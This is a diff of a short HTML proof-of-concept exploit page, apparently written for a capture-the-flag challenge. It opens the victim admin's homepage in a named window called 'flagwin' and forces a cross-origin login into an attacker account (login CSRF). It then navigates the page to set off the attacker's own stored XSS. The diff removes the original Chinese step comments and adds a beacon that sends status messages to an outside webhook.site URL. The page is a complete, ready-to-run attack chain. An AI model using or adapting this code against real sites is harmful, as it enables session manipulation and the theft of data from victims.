@@ -1,34 +1,49 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>poc</title>
+<title>dbg</title>
 <script>
+const HOOK = 'https://webhook.site/0df0cf2d-361c-41d8-9a41-baab3da0cd73';
+const LOCAL = 'http://localhost:3000';
 const USER = 'aaaabbbb';
 const PASS = 'aaaabbbbcc';
-const LOCAL = 'http://localhost:3000';
 
-// 第一步：先把 admin 的主页留在命名窗口里
-window.open(`${LOCAL}/`, 'flagwin');
+function log(msg) {
+  new Image().src = HOOK + '?dbg=' + encodeURIComponent(msg) + '&t=' + Date.now();
+}
 
-// 第二步：把当前会话切成你的账号
+log('page-start origin=' + location.origin);
+
+let w = null;
+try {
+  w = window.open(LOCAL + '/', 'flagwin');
+  log('window-open=' + (!!w));
+} catch (e) {
+  log('window-open-err=' + e);
+}
+
 setTimeout(async () => {
   try {
-    await fetch(`${LOCAL}/api/auth/login`, {
+    log('before-login-fetch');
+    await fetch(LOCAL + '/api/auth/login', {
       method: 'POST',
       mode: 'no-cors',
       credentials: 'include',
       headers: {
-        'Content-Type': 'text/plain'
+        'Content-Type': 'text/plain;charset=UTF-8'
       },
       body: JSON.stringify({
         username: USER,
         password: PASS
       })
     });
-  } catch (e) {}
+    log('after-login-fetch');
+  } catch (e) {
+    log('login-fetch-err=' + e);
+  }
 
-  // 第三步：当前页跳到你的主页，触发你自己的 stored XSS
   setTimeout(() => {
-    location = `${LOCAL}/`;
-  }, 1200);
-}, 1500);
+    log('before-nav-home');
+    location = LOCAL + '/';
+  }, 3000);
+}, 2500);
 </script>
